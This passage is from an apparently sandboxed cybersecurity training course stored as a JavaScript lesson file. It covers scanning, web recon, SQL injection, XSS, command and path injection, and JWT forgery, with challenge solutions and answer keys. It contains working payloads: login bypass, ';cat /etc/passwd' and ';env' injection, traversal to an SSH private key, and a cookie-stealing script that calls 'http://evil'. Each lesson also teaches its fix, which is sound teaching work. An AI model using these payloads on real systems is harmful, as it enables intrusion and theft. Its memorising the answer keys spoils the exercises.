      { code: 'import socket\n\ndef grab_banner(host, port):\n    s = socket.socket()\n    s.settimeout(1.5)\n    try:\n        s.connect((host, port))\n        return s.recv(100).decode(errors="replace").strip()\n    except OSError:\n        return None\n    finally:\n        s.close()\n\nprint("22:", grab_banner("10.10.0.5", 22))' },
      { p: 'The banner reveals the software and often the exact version — which you then cross-reference against known vulnerabilities. That is the bridge from "port open" to "here is the way in".' },
      { h: 'connect_ex is cleaner for scanning' },
      { code: 'import socket\ndef is_open(host, port):\n    s = socket.socket()\n    s.settimeout(1)\n    result = s.connect_ex((host, port))   # 0 == open, no exception\n    s.close()\n    return result == 0\n\nprint([p for p in [22, 23, 80, 445] if is_open("192.168.56.101", p)])' },
      { warn: 'Scanning is loud and, against systems you do not own, illegal. Real scanners add rate-limiting and randomised ordering; real engagements have a signed scope. Here you scan the sandbox freely.' },
      { tip: 'nmap is the professional tool and does far more — SYN scans, OS fingerprinting, a scripting engine. Understanding the socket underneath is what lets you read its output and script around it.' }
    ],
    challenges: [
      { kind: 'code', prompt: 'Scan 10.10.0.5 for open ports among [22, 25, 80, 443, 3306] and print the sorted list of open ones.',
        expect: '[22, 80, 443]',
        solution: 'import socket\ndef is_open(h, p):\n    s = socket.socket(); s.settimeout(1)\n    r = s.connect_ex((h, p)); s.close()\n    return r == 0\nprint(sorted(p for p in [22, 25, 80, 443, 3306] if is_open("10.10.0.5", p)))' },
      { kind: 'code', prompt: 'Scan the vulnerable box 192.168.56.101 across 1..100 and print how many ports are open.',
        expect: '3',
        solution: 'import socket\ndef is_open(h, p):\n    s = socket.socket(); s.settimeout(1)\n    r = s.connect_ex((h, p)); s.close()\n    return r == 0\nprint(sum(1 for p in range(1, 101) if is_open("192.168.56.101", p)))' },
      { kind: 'code', prompt: 'Grab the banner on 192.168.56.101 port 21 and print it.',
        validate: 'ftp_banner',
        solution: 'import socket\ns = socket.socket(); s.settimeout(2)\ns.connect(("192.168.56.101", 21))\nprint(s.recv(100).decode().strip())' },
      { kind: 'mc', prompt: 'Why grab a banner after finding an open port?',
        options: ['To close it', 'To learn the software and version for vuln matching',
                  'To speed up the scan', 'It is required by TCP'],
        answer: 1 },
      { kind: 'mc', prompt: 'connect_ex returns 0 when the port is:',
        options: ['Closed', 'Open', 'Filtered', 'Unknown'], answer: 1 }
    ]
  },

  // ==========================================================================
  {
    id: 'cy11', title: 'HTTP with Python', sub: 'requests, headers, sessions and status codes',
    teach: [
      { p: 'The web runs on HTTP: a client sends a request (method + path + headers + optional body), the server sends a response (status code + headers + body). `requests` is the tool. All of this hits the sandbox\'s simulated shop.' },
      { code: 'import requests\n\nr = requests.get("http://shop.local/")\nprint(r.status_code, r.reason)\nprint(r.headers["Content-Type"])\nprint(r.text[:50])' },
      { list: [
        '**2xx** success · **3xx** redirect · **4xx** your fault (401 auth, 403 forbidden, 404 missing) · **5xx** server fault',
        'Methods: **GET** (read), **POST** (submit), **PUT/PATCH** (update), **DELETE**'
      ] },
      { h: 'Query strings, POST bodies, JSON' },
      { code: 'import requests\n\nr = requests.get("http://shop.local/search", params={"q": "duck"})\nprint(r.url)\n\nr = requests.post("http://shop.local/login", data={"username": "alice", "password": "password123"})\nprint(r.status_code)\n\napi = requests.get("http://shop.local/api/products")\nprint(api.json()[0])' },
      { h: 'Headers and sessions' },
      { code: 'import requests\n\nheaders = {"User-Agent": "recon-bot/1.0", "X-Forwarded-For": "127.0.0.1"}\nr = requests.get("http://shop.local/", headers=headers)\nprint(r.status_code)\n\n# A session persists cookies across requests, like a logged-in browser:\ns = requests.Session()\ns.post("http://shop.local/login", data={"username": "admin", "password": "S3cur3!Adm1n"})\nprint("session cookies:", dict(s.cookies))' },
      { h: 'Inspecting what the server tells you' },
      { code: 'import requests\nr = requests.get("http://shop.local/robots.txt")\nprint(r.text)' },
      { tip: 'robots.txt is a recon goldmine: it often lists exactly the paths the admin wanted hidden (/admin, /backup). It is a signpost, not a lock.' }
    ],
    challenges: [
      { kind: 'code', prompt: 'GET http://shop.local/ and print the status code.',
        expect: '200',
        solution: 'import requests\nprint(requests.get("http://shop.local/").status_code)' },
      { kind: 'code', prompt: 'Fetch /robots.txt and print how many paths are Disallowed.',
        expect: '2',
        solution: 'import requests\nt = requests.get("http://shop.local/robots.txt").text\nprint(t.count("Disallow"))' },
      { kind: 'code', prompt: 'Call the JSON API /api/products and print the name of the first product.',
        expect: 'Rubber Duck',
        solution: 'import requests\nprint(requests.get("http://shop.local/api/products").json()[0]["name"])' },
      { kind: 'code', prompt: 'Log in as admin (password S3cur3!Adm1n) with a Session and print True if a session cookie was set.',
        expect: 'True',
        solution: 'import requests\ns = requests.Session()\ns.post("http://shop.local/login", data={"username": "admin", "password": "S3cur3!Adm1n"})\nprint(len(dict(s.cookies)) > 0)' },
      { kind: 'mc', prompt: 'A response with status 403 means:',
        options: ['Not found', 'Forbidden — you are authenticated but not allowed',
                  'Server error', 'Success'],
        answer: 1 }
    ]
  },

  // ==========================================================================
  {
    id: 'cy12', title: 'Web Recon & Enumeration', sub: 'discovering the attack surface',
    teach: [
      { p: 'Before exploiting, you map. Enumeration finds hidden paths, parameters, technologies and endpoints — the more surface you see, the more likely one piece is weak.' },
      { h: 'Directory brute-forcing' },
      { code: 'import requests\n\nwordlist = ["admin", "login", "backup", "api", "config", "flag", "old", "test"]\nfor path in wordlist:\n    r = requests.get(f"http://shop.local/{path}")\n    if r.status_code != 404:\n        print(f"{r.status_code}  /{path}")' },
      { p: 'A 200 means it exists and is readable; a 403 means it exists but is protected (interesting!); a 401 means it wants credentials. Only 404 is truly "nothing here".' },
      { h: 'Reading what the app leaks' },
      { code: 'import requests\n# robots.txt often names the paths worth probing:\nfor line in requests.get("http://shop.local/robots.txt").text.splitlines():\n    if line.startswith("Disallow:"):\n        print("probe:", line.split()[1])' },
      { h: 'Fingerprinting technology' },
      { code: 'import requests\nr = requests.get("http://shop.local/")\nprint("Server:", r.headers.get("Server", "unknown"))\nprint("Powered-By:", r.headers.get("X-Powered-By", "hidden"))' },
      { h: 'Parameter discovery' },
      { code: 'import requests\n# Does /account take an id parameter?\nfor pid in [1, 2, 3, 999]:\n    r = requests.get("http://shop.local/account", params={"id": pid})\n    marker = "found" if r.status_code == 200 else "missing"\n    print(pid, marker)' },
      { tip: 'Good recon is systematic and quiet. Real tools (gobuster, ffuf, feroxbuster) do this at scale with big wordlists; the logic is exactly the loop above. Note what is *unusual* — a 403 among 404s, an error message, a version number.' }
    ],
    challenges: [
      { kind: 'code', prompt: 'Brute-force the wordlist against shop.local and print each path that is NOT 404, as `status /path`.',
        starter: 'import requests\nwords = ["home", "admin", "search", "nope", "flag"]\n',
        validate: 'enum_paths',
        solution: 'import requests\nwords = ["home", "admin", "search", "nope", "flag"]\nfor w in words:\n    r = requests.get(f"http://shop.local/{w}")\n    if r.status_code != 404:\n        print(r.status_code, "/" + w)' },
      { kind: 'code', prompt: 'Print the Server header of shop.local.',
        expect: 'sim-httpd/1.0',
        solution: 'import requests\nprint(requests.get("http://shop.local/").headers.get("Server"))' },
      { kind: 'code', prompt: 'The /admin path exists but is protected. Print its status code (unauthenticated).',
        expect: '403',
        solution: 'import requests\nprint(requests.get("http://shop.local/admin").status_code)' },
      { kind: 'mc', prompt: 'Which status code is MOST interesting during enumeration?',
        options: ['404', '403 (exists but forbidden)', '301', '200 only'],
        answer: 1, explain: 'A 403 reveals a resource exists and someone tried to hide it.' },
      { kind: 'code', prompt: 'Discover which account ids exist (1..5) on /account by checking for status 200. Print the list.',
        expect: '[1, 2, 3, 4]',
        solution: 'import requests\nfound = []\nfor i in range(1, 6):\n    if requests.get("http://shop.local/account", params={"id": i}).status_code == 200:\n        found.append(i)\nprint(found)' }
    ]
  },

  // ==========================================================================
  {
    id: 'cy13', title: 'SQL Injection', sub: 'the number-one web vulnerability, hands-on',
    teach: [
      { p: 'SQL injection happens when user input is concatenated into a query, so the input can change the query\'s *structure*. The sandbox\'s login endpoint is genuinely vulnerable — you will really exploit it.' },
      { h: 'The bug, in the server\'s own code' },
      { code: '# The shop builds its login query like this (the vulnerability):\n#   sql = "SELECT ... WHERE username = \'" + u + "\' AND password = \'" + p + "\'"\n# Supply username = admin\'--  and the password check is commented out.\nimport requests\nr = requests.post("http://shop.local/login",\n                  data={"username": "admin\'--", "password": "anything"})\nprint(r.status_code)\nprint("CTF" in r.text)     # logged in as admin without the password' },
      { h: 'Authentication bypass with a tautology' },
      { code: "import requests\nr = requests.post('http://shop.local/login',\n                  data={'username': \"x' OR '1'='1\", 'password': \"y' OR '1'='1\"})\nprint('rows returned' in r.text, r.status_code)" },
      { p: 'The `OR \'1\'=\'1\'` makes the WHERE clause always true, so every row matches and the app logs you in as the first user.' },
      { h: 'Now the defence — and prove it works' },
      { code: 'import sqlite3\ncon = sqlite3.connect(":memory:")\ncon.execute("CREATE TABLE users (name, pw)")\ncon.execute("INSERT INTO users VALUES (\'admin\', \'secret\')")\n\nevil = "admin\' --"\n# WRONG: string building — injectable\nbad = con.execute("SELECT * FROM users WHERE name = \'" + evil + "\'").fetchall()\nprint("vulnerable query returned:", bad)\n# RIGHT: parameterised — the value can never be SQL\ngood = con.execute("SELECT * FROM users WHERE name = ?", (evil,)).fetchall()\nprint("safe query returned:", good)' },
      { warn: 'The fix is always the same and always works: **parameterised queries** (`?` placeholders). The database treats the value as data, never as SQL. Escaping by hand, blocklisting quotes, and ORMs-used-wrong all fail; parameterisation does not.' },
      { tip: 'The deeper lesson generalises to every injection (command, LDAP, XPath, template): the vulnerability is *mixing untrusted data into a language*. The fix is *separating code from data*.' }
    ],
    challenges: [
      { kind: 'code', prompt: 'Bypass the login as admin using a comment injection in the username. Print True if the response contains "CTF".',
        expect: 'True',
        hint: "username = admin'--",
        solution: 'import requests\nr = requests.post("http://shop.local/login", data={"username": "admin\'--", "password": "x"})\nprint("CTF" in r.text)' },
      { kind: 'code', prompt: 'Extract the admin secret_note: log in via SQLi and print the CTF flag using a regex.',
        expect: 'CTF{sql_injection_is_a_parameterisation_bug}',
        hint: 'Search the response text with re for CTF\\{[^}]*\\}.',
        solution: 'import requests, re\nr = requests.post("http://shop.local/login", data={"username": "admin\'--", "password": "x"})\nprint(re.search(r"CTF\\{[^}]*\\}", r.text).group())' },
      { kind: 'mc', prompt: 'What is the root cause of SQL injection?',
        options: ['Weak passwords', 'Untrusted input concatenated into query structure',
                  'Slow databases', 'Missing HTTPS'],
        answer: 1 },
      { kind: 'code', prompt: 'Prove the fix: run the malicious input through a PARAMETERISED query and show it returns no rows. Print the result list.',
        starter: 'import sqlite3\ncon = sqlite3.connect(":memory:")\ncon.execute("CREATE TABLE u (name)")\ncon.execute("INSERT INTO u VALUES (\'admin\')")\nevil = "admin\' OR \'1\'=\'1"\n',
        expect: '[]',
        solution: 'import sqlite3\ncon = sqlite3.connect(":memory:")\ncon.execute("CREATE TABLE u (name)")\ncon.execute("INSERT INTO u VALUES (\'admin\')")\nevil = "admin\' OR \'1\'=\'1"\nprint(con.execute("SELECT * FROM u WHERE name = ?", (evil,)).fetchall())' },
      { kind: 'mc', prompt: 'The reliable fix for SQL injection is:',
        options: ['Escaping quotes', 'Blocking the word SELECT', 'Parameterised queries',
                  'Rate limiting'],
        answer: 2 }
    ]
  },

  // ==========================================================================
  {
    id: 'cy14', title: 'XSS & Client-Side Attacks', sub: 'when the browser runs the attacker\'s code',
    teach: [
      { p: 'Cross-site scripting is injection into a *web page*: if user input is reflected into HTML without escaping, an attacker\'s `<script>` runs in the victim\'s browser — stealing cookies, keystrokes, or making requests as the victim.' },
      { h: 'Reflected XSS in the sandbox' },
      { code: 'import requests\n# The /search page echoes the query straight into the HTML:\nr = requests.get("http://shop.local/search", params={"q": "<script>alert(1)</script>"})\nprint("<script>" in r.text)   # the payload came back unescaped' },
      { list: [
        '**Reflected** — payload in the request is echoed straight back (a malicious link)',
        '**Stored** — payload saved server-side (a comment, a profile) and served to every viewer',
        '**DOM-based** — client-side JS writes untrusted data into the page'
      ] },
      { h: 'The impact: stealing a session' },
      { code: '# A classic payload does not alert() — it exfiltrates the cookie:\npayload = "<script>fetch(\'http://evil/c?\'+document.cookie)</script>"\nprint("A victim viewing this runs it with THEIR session:", len(payload), "bytes")' },
      { h: 'The fix: context-aware output encoding' },
      { code: 'import html\nuser_input = \'<img src=x onerror="steal()">\'\nprint(html.escape(user_input))   # &lt;img ... &gt; — inert text, not a tag' },
      { p: 'Escape on **output**, matched to context: HTML body, HTML attribute, JavaScript, and URL each need different encoding. Templating engines (Jinja2 with autoescape) do this for you — which is why hand-built HTML is where XSS lives.' },
      { warn: 'Defence in depth: a Content-Security-Policy header that forbids inline scripts turns many XSS bugs from "game over" into "blocked", and the HttpOnly cookie flag stops JavaScript from reading session cookies at all.' },
      { tip: 'Input validation helps but is not the fix — you cannot blocklist your way out, because HTML has too many ways to run code (`<svg onload>`, `<iframe srcdoc>`, ...). Output encoding is the reliable control.' }
    ],
    challenges: [
      { kind: 'code', prompt: 'Confirm reflected XSS: send a script payload to /search and print True if it is reflected unescaped.',
        expect: 'True',
        solution: 'import requests\nr = requests.get("http://shop.local/search", params={"q": "<script>x</script>"})\nprint("<script>x</script>" in r.text)' },
      { kind: 'code', prompt: 'Use html.escape to neutralise the payload and print the safe version.',
        starter: 'import html\npayload = "<script>alert(1)</script>"\n',
        expect: '&lt;script&gt;alert(1)&lt;/script&gt;',
        solution: 'import html\npayload = "<script>alert(1)</script>"\nprint(html.escape(payload))' },
      { kind: 'mc', prompt: 'Stored XSS is more dangerous than reflected because:',
        options: ['It is faster', 'It runs for every user who views the page, no link needed',
                  'It bypasses HTTPS', 'It is easier to write'],
        answer: 1 },
      { kind: 'mc', prompt: 'The primary fix for XSS is:',
        options: ['Input length limits', 'Context-aware output encoding',
                  'Blocking the word script', 'Using POST'],
        answer: 1 },
      { kind: 'mc', prompt: 'What does the HttpOnly cookie flag do?',
        options: ['Encrypts the cookie', 'Stops JavaScript from reading the cookie',
                  'Makes it expire faster', 'Blocks XSS entirely'],
        answer: 1, explain: 'It limits the damage of XSS by hiding the cookie from document.cookie.' }
    ]
  },

  // ==========================================================================
  {
    id: 'cy15', title: 'Command & Path Injection', sub: 'when your input reaches a shell or the filesystem',
    teach: [
      { p: 'Same root cause as SQLi, different interpreter. If user input reaches a shell command or a file path, the attacker can break out of the intended operation.' },
      { h: 'Command injection' },
      { code: 'import requests\n# The /ping endpoint runs: ping <host>  with the host taken from the URL.\n# A ; lets us chain a second command:\nr = requests.get("http://shop.local/ping", params={"host": "127.0.0.1;whoami"})\nprint(r.text.strip().splitlines()[-1])   # the injected command ran' },
      { code: 'import requests\nr = requests.get("http://shop.local/ping", params={"host": "127.0.0.1;cat /etc/passwd"})\nprint("root:x:0:0" in r.text)' },
      { h: 'The fix: never build a shell string; pass an argument list' },
      { code: 'import subprocess\nhost = "127.0.0.1; rm -rf /"      # attacker input\n# WRONG: shell=True interprets the metacharacters\n# subprocess.run(f"ping {host}", shell=True)\n# RIGHT: a list, no shell — the ; is just a literal argument\nresult = subprocess.run(["ping", host])   # host is one inert argument\nprint("passed the whole string as a single, harmless argument")' },
      { p: 'With an argument list and no `shell=True`, the OS never involves a shell, so `;`, `|`, `&&`, `$()` are just characters in a filename that does not exist. That is the fix.' },
      { h: 'Path traversal' },
      { code: 'import requests\n# /download serves files/<name> with no normalisation:\nr = requests.get("http://shop.local/download", params={"file": "../../../etc/passwd"})\nprint(r.text.splitlines()[0])' },
      { code: 'import os\n# The fix: resolve, then confirm it stays inside the allowed root.\nBASE = "/var/www/public"\ndef safe(name):\n    full = os.path.normpath(os.path.join(BASE, name))\n    return full.startswith(BASE + os.sep) or full == BASE\nprint(safe("report.pdf"), safe("../../etc/passwd"))' },
      { warn: 'Blocklisting `../` is not enough — attackers use `....//`, URL-encoding (`%2e%2e%2f`), absolute paths, and unicode tricks. Canonicalise the path first, then check it is within the allowed directory.' }
    ],
    challenges: [
      { kind: 'code', prompt: 'Exploit /ping to run `id` and print True if the output shows uid=33.',
        expect: 'True',
        solution: 'import requests\nr = requests.get("http://shop.local/ping", params={"host": "127.0.0.1;id"})\nprint("uid=33" in r.text)' },
      { kind: 'code', prompt: 'Use command injection via /ping to read the DB_PASSWORD from the environment. Print True if a CTF flag is leaked.',
        expect: 'True',
        hint: 'Chain `;env` after the host.',
        solution: 'import requests\nr = requests.get("http://shop.local/ping", params={"host": "127.0.0.1;env"})\nprint("CTF{" in r.text)' },
      { kind: 'code', prompt: 'Use path traversal on /download to read /home/analyst/.ssh/id_rsa and print True if you got the private key.',
        expect: 'True',
        solution: 'import requests\nr = requests.get("http://shop.local/download", params={"file": "../../../home/analyst/.ssh/id_rsa"})\nprint("PRIVATE KEY" in r.text)' },
      { kind: 'mc', prompt: 'The correct fix for command injection is:',
        options: ['Escape semicolons', 'Use subprocess with an argument list and no shell=True',
                  'Filter the word cat', 'Run as a lower-privilege user'],
        answer: 1 },
      { kind: 'code', prompt: 'Implement the traversal check: print False for "../../etc/passwd" and True for "ok.txt".',
        starter: 'import os\nBASE = "/srv/files"\ndef safe(name):\n    full = os.path.normpath(os.path.join(BASE, name))\n    return full == BASE or full.startswith(BASE + "/")\nprint(safe("ok.txt"))\nprint(safe("../../etc/passwd"))',
        expect: 'True\nFalse',
        solution: 'import os\nBASE = "/srv/files"\ndef safe(name):\n    full = os.path.normpath(os.path.join(BASE, name))\n    return full == BASE or full.startswith(BASE + "/")\nprint(safe("ok.txt"))\nprint(safe("../../etc/passwd"))' }
    ]
  },

  // ==========================================================================
  {
    id: 'cy16', title: 'Authentication & Access Control Flaws', sub: 'IDOR, broken auth, and JWT attacks',
    teach: [
      { p: 'Even with perfect input handling, apps fail by trusting the user about *who they are* and *what they may access*. These are the most common serious bugs in modern apps.' },
      { h: 'IDOR — Insecure Direct Object Reference' },
      { code: 'import requests\n# /account?id=N returns that account with no ownership check.\n# You are user 2, but nothing stops you reading user 1:\nfor uid in [2, 1]:\n    r = requests.get("http://shop.local/account", params={"id": uid})\n    print(uid, "->", "secret leaked" if "note:" in r.text else "ok")' },
      { p: 'The fix is an **authorization** check on every object: "does the *current session* own this id?" Never rely on the id being unguessable or hidden in the UI.' },
      { h: 'JWT: the alg=none attack' },
      { p: 'A JSON Web Token is `header.payload.signature`, base64url-encoded. If a server trusts the token\'s own `alg` field, an attacker sets `alg: none`, drops the signature, and forges any claims.' },
      { code: 'import jwt, base64, json\n\n# A legitimately signed token:\nsecret = "server-hs256-key"\ntoken = jwt.encode({"user": "alice", "role": "user"}, secret, algorithm="HS256")\nprint("payload:", jwt.decode(token, secret, algorithms=["HS256"]))\n\n# Forge an admin token with alg=none (no signature):\nheader = base64.urlsafe_b64encode(b\'{"alg":"none","typ":"JWT"}\').rstrip(b"=")\npayload = base64.urlsafe_b64encode(b\'{"user":"attacker","role":"admin"}\').rstrip(b"=")\nforged = header.decode() + "." + payload.decode() + "."\nprint("forged:", forged[:40], "...")' },
      { code: 'import requests\n# The intranet API trusts alg=none — the forged token reaches the admin endpoint:\nimport base64\nheader = base64.urlsafe_b64encode(b\'{"alg":"none","typ":"JWT"}\').rstrip(b"=").decode()\npayload = base64.urlsafe_b64encode(b\'{"role":"admin"}\').rstrip(b"=").decode()\nforged = f"{header}.{payload}."\nr = requests.get("http://intranet.local/api/admin",\n                 headers={"Authorization": "Bearer " + forged})\nprint(r.status_code, "CTF" in r.text)' },
      { warn: 'The fix: the server must pin the algorithm (`algorithms=["HS256"]`), reject `none`, and never confuse HMAC with RSA (the "RS256→HS256 key confusion" attack uses the public key as the HMAC secret). Verify, do not trust.' },
      { list: [
        'Broken auth: no lockout (brute force), predictable tokens, secrets in URLs, missing re-auth for sensitive actions',
        'Broken access control: IDOR, missing function-level checks, trusting client-side role flags',
        'Fix: check authorization server-side, on every request, for every object'
      ] }
    ],
    challenges: [
      { kind: 'code', prompt: 'Exploit the IDOR: read account id=1 (not yours) and print True if its secret note leaks a CTF flag.',
        expect: 'True',
        solution: 'import requests\nr = requests.get("http://shop.local/account", params={"id": 1})\nprint("CTF{" in r.text)' },
      { kind: 'code', prompt: 'Forge a JWT with alg=none and role=admin, then reach /api/admin on the intranet. Print True if you get the flag.',
        expect: 'True',
        solution: 'import requests, base64\nh = base64.urlsafe_b64encode(b\'{"alg":"none","typ":"JWT"}\').rstrip(b"=").decode()\np = base64.urlsafe_b64encode(b\'{"role":"admin"}\').rstrip(b"=").decode()\nforged = f"{h}.{p}."\nr = requests.get("http://intranet.local/api/admin", headers={"Authorization": "Bearer " + forged})\nprint("CTF{" in r.text)' },
      { kind: 'mc', prompt: 'The fix for IDOR is:',
        options: ['Longer ids', 'A server-side ownership/authorization check per request',
                  'Hiding the id in the UI', 'Encrypting the id'],
        answer: 1 },
      { kind: 'mc', prompt: 'The alg=none JWT attack works when the server:',
        options: ['Uses HTTPS', 'Trusts the algorithm declared in the token header',
                  'Uses a long secret', 'Sets an expiry'],
        answer: 1 },
      { kind: 'code', prompt: 'Decode (without verifying) the payload of this JWT and print the role claim.',
        starter: 'import jwt\ntoken = jwt.encode({"user": "bob", "role": "auditor"}, "k", algorithm="HS256")\n',
        expect: 'auditor',
        solution: 'import jwt\ntoken = jwt.encode({"user": "bob", "role": "auditor"}, "k", algorithm="HS256")\nprint(jwt.decode(token, "k", algorithms=["HS256"])["role"])' }
    ]
  }

  );
})(typeof window !== 'undefined' ? window : globalThis);
